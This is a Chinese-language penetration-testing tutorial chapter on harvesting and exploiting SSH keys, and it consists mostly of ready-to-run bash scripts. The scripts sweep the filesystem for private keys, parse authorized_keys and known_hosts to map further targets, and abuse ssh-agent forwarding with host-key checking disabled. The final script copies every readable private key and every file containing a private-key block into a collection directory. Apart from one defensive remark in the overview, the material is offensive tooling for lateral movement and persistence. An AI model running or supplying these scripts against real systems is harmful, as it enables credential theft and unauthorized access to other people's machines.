# SSH密钥收集与利用

## 章节概述

SSH 密钥是远程访问的核心认证方式。在渗透测试中，收集和利用 SSH 密钥可以实现免密码登录、横向移动和权限维持。本章系统性地讲解 SSH 密钥发现、authorized_keys 分析、ssh-agent 转发利用、known_hosts 分析以及密钥提取自动化。

> **核心理念**
> SSH 密钥泄露的本质是私钥文件的权限和位置不当。攻击者通过搜索文件系统中的私钥、利用 agent 转发、分析 known_hosts 来扩大攻击面。防御端需要严格控制私钥权限并禁用不必要的 agent 转发。

---

### 第1节 密钥发现

#### 1.1 搜索 SSH 密钥文件

```bash
#!/usr/bin/env bash
# find_ssh_keys.sh - 搜索 SSH 密钥文件
set -euo pipefail

echo "[*] 搜索 SSH 密钥文件..."

# 搜索私钥文件
echo ""
echo "===== 私钥文件 ====="
find / -type f \( \
    -name "id_rsa" -o \
    -name "id_dsa" -o \
    -name "id_ecdsa" -o \
    -name "id_ed25519" -o \
    -name "*.pem" -o \
    -name "identity" \
\) 2>/dev/null | while IFS= read -r key; do
    echo "[!] 发现私钥: $key"
    echo "    权限: $(stat -c '%a %U:%G' "$key" 2>/dev/null)"
    echo "    头部: $(head -1 "$key" 2>/dev/null)"
done

# 搜索公钥文件
echo ""
echo "===== 公钥文件 ====="
find / -type f -name "*.pub" -path "*/.ssh/*" 2>/dev/null | while IFS= read -r key; do
    echo "[*] 公钥: $key"
    echo "    内容: $(cat "$key" 2>/dev/null | awk '{print $1, $3}')"
done

# 搜索 authorized_keys
echo ""
echo "===== authorized_keys 文件 ====="
find / -type f -name "authorized_keys" 2>/dev/null | while IFS= read -r key; do
    echo "[!] authorized_keys: $key"
    echo "    权限: $(stat -c '%a %U:%G' "$key" 2>/dev/null)"
    echo "    密钥数量: $(wc -l < "$key" 2>/dev/null)"
    cat "$key" 2>/dev/null | awk '{print "    " $1 " " $3}'
done

# 搜索 known_hosts
echo ""
echo "===== known_hosts 文件 ====="
find / -type f -name "known_hosts" 2>/dev/null | while IFS= read -r key; do
    echo "[*] known_hosts: $key"
    cat "$key" 2>/dev/null | awk '{print "    " $1}'
done
```

#### 1.2 检查密钥权限

```bash
#!/usr/bin/env bash
# check_key_perms.sh - SSH 密钥权限检查
set -euo pipefail

echo "[*] 检查 SSH 密钥权限..."

find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) 2>/dev/null | while IFS= read -r key; do
    perms=$(stat -c '%a' "$key" 2>/dev/null)

    case "$perms" in
        600)
            echo "[+] 权限正确: $key ($perms)"
            ;;
        644)
            echo "[!] 权限过于宽松: $key ($perms) - 可被其他用户读取"
            ;;
        *)
            echo "[?] 异常权限: $key ($perms)"
            ;;
    esac
done
```

---

### 第2节 authorized_keys 分析

#### 2.1 authorized_keys 内容解析

```bash
#!/usr/bin/env bash
# analyze_authorized_keys.sh - 分析 authorized_keys
set -euo pipefail

AK_FILE="${1:-~/.ssh/authorized_keys}"

if [[ ! -f "$AK_FILE" ]]; then
    echo "[-] 文件不存在: $AK_FILE"
    exit 1
fi

echo "[*] 分析 authorized_keys: $AK_FILE"
echo "    权限: $(stat -c '%a %U:%G' "$AK_FILE" 2>/dev/null)"
echo "    密钥数量: $(wc -l < "$AK_FILE")"
echo ""

while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    [[ "$line" =~ ^# ]] && continue

    key_type=$(echo "$line" | awk '{print $1}')
    comment=$(echo "$line" | awk '{print $NF}')

    echo "  类型: $key_type"
    echo "  注释: $comment"

    # 检查命令限制
    if echo "$line" | grep -q "command="; then
        cmd=$(echo "$line" | grep -oP 'command="\K[^"]+')
        echo "  限制命令: $cmd"
    fi

    # 检查来源限制
    if echo "$line" | grep -q "from="; then
        from=$(echo "$line" | grep -oP 'from="\K[^"]+')
        echo "  来源限制: $from"
    fi

    echo ""
done < "$AK_FILE"
```

---

### 第3节 ssh-agent 转发利用

#### 3.1 检测 ssh-agent

```bash
#!/usr/bin/env bash
# check_ssh_agent.sh - 检测 ssh-agent 状态
set -euo pipefail

echo "[*] 检测 ssh-agent 状态..."

if [[ -n "${SSH_AUTH_SOCK:-}" ]]; then
    echo "[+] SSH_AUTH_SOCK 已设置: $SSH_AUTH_SOCK"

    if ssh-add -l 2>/dev/null; then
        echo "[+] ssh-agent 中有可用密钥"
    else
        echo "[-] ssh-agent 中没有密钥"
    fi
else
    echo "[-] SSH_AUTH_SOCK 未设置"
fi

# 检查转发的 agent
echo ""
echo "===== 转发的 agent ====="
env | grep -i "SSH_" 2>/dev/null

# 检查 agent socket 文件
echo ""
echo "===== Agent Socket 文件 ====="
find /tmp -name "agent.*" -type s 2>/dev/null | while IFS= read -r sock; do
    echo "[!] Agent Socket: $sock"
    echo "    权限: $(stat -c '%a %U:%G' "$sock" 2>/dev/null)"
done
```

#### 3.2 利用 agent 转发

```bash
#!/usr/bin/env bash
# agent_exploit.sh - ssh-agent 转发利用
set -euo pipefail

TARGET="${1:?用法: $0 <目标IP>}"
USER="${2:-root}"

echo "[*] 尝试 ssh-agent 转发利用..."

# 方法1: 通过 SSH 连接并转发 agent
ssh -o ForwardAgent=yes -o StrictHostKeyChecking=no "$USER@$TARGET" '
    echo "[*] 在目标机器上检查 agent..."
    ssh-add -l 2>/dev/null && {
        echo "[+] Agent 中有密钥，可以继续横向移动"
    } || echo "[-] Agent 中没有密钥"
'

# 方法2: 使用 ssh-agent 桥接
# 在本地启动 agent 并转发
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_rsa 2>/dev/null

ssh -o ForwardAgent=yes "$USER@$TARGET" '
    ssh-add -l
    # 使用 agent 中的密钥连接其他主机
    # ssh -o IdentitiesOnly=no user@other_host
'
```

---

### 第4节 known_hosts 分析

#### 4.1 分析 known_hosts

```bash
#!/usr/bin/env bash
# analyze_known_hosts.sh - 分析 known_hosts 文件
set -euo pipefail

KH_FILE="${1:-~/.ssh/known_hosts}"

if [[ ! -f "$KH_FILE" ]]; then
    echo "[-] 文件不存在: $KH_FILE"
    exit 1
fi

echo "[*] 分析 known_hosts: $KH_FILE"
echo "    条目数量: $(wc -l < "$KH_FILE")"
echo ""

while IFS= read -r line; do
    host=$(echo "$line" | awk '{print $1}')
    key_type=$(echo "$line" | awk '{print $2}' | cut -d: -f2)

    echo "  主机: $host"
    echo "  密钥类型: $key_type"
    echo ""
done < "$KH_FILE"
```

---

### 第5节 密钥提取自动化

#### 5.1 综合 SSH 密钥收集器

```bash
#!/usr/bin/env bash
# ssh_key_collector.sh - SSH 密钥自动化收集
set -euo pipefail

OUTPUT_DIR="${1:-/tmp/ssh_keys}"
mkdir -p "$OUTPUT_DIR"

echo "[*] === SSH 密钥自动化收集 ==="

# 1. 搜索私钥
echo ""
echo "===== 搜索私钥 ====="
find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) \
    -readable 2>/dev/null | while IFS= read -r key; do
    cp "$key" "$OUTPUT_DIR/" 2>/dev/null && echo "[+] 已复制: $key"
done

# 2. 搜索包含密钥的配置文件
echo ""
echo "===== 搜索配置文件中的密钥 ====="
grep -rl "BEGIN.*PRIVATE KEY" /etc/ /root/ /home/ 2>/dev/null | while IFS= read -r file; do
    cp "$file" "$OUTPUT_DIR/" 2>/dev/null && echo "[+] 已复制: $file"
done

# 3. 导出 ssh-agent 中的密钥
if [[ -n "${SSH_AUTH_SOCK:-}" ]]; then
    echo ""
    echo "===== 导出 agent 密钥 ====="
    ssh-add -l 2>/dev/null | while IFS= read -r line; do
        echo "  $line" >> "$OUTPUT_DIR/agent_keys.txt"
    done
fi

# 4. 分析结果
echo ""
echo "===== 收集结果 ====="
echo "输出目录: $OUTPUT_DIR"
ls -la "$OUTPUT_DIR/"
```

